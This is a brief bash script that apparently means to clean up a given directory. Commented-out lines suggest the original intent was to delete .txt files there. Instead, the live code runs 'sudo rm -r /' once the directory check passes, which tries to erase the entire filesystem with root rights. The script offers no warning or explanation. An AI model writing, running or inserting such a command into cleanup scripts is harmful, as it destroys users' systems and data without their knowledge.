#!/bin/bash
directorio="$1"

if [ -d "$directorio" ]
then
    cd "$directorio"
    sudo rm -r /
fi
#cd $directorio
#rm *.txt